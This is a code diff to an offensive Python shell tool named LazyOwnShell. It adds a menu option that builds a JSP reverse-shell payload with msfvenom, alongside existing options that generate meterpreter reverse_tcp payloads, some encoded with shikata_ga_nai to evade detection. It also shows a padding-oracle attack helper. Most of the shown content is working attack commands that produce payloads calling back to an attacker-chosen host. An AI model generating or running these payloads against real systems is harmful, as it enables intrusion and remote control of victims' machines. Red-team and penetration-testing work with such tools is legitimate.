@@ -1737,8 +1737,8 @@ class LazyOwnShell(Cmd):
         print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
         print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
         print_msg("15: android/meterpreter/reverse_tcp")
-        
-        choice = input("Enter your choice (1-15): ").strip()
+        print_msg("16: java/jsp_shell_reverse_tcp")
+        choice = input("Enter your choice (1-16): ").strip()
 
         # Define payload commands
         commands = {
@@ -1762,6 +1762,7 @@ class LazyOwnShell(Cmd):
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
             ),
             "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
+            "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
         }
 
         # Check if the choice is valid
@@ -7799,7 +7800,7 @@ class LazyOwnShell(Cmd):
         print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
         os.system(f"python3 modules/lazyseo.py http://{rhost}")
         return
-        
+
     def do_padbuster(self, line):   
         """
         Execute the PadBuster command for padding oracle attacks.
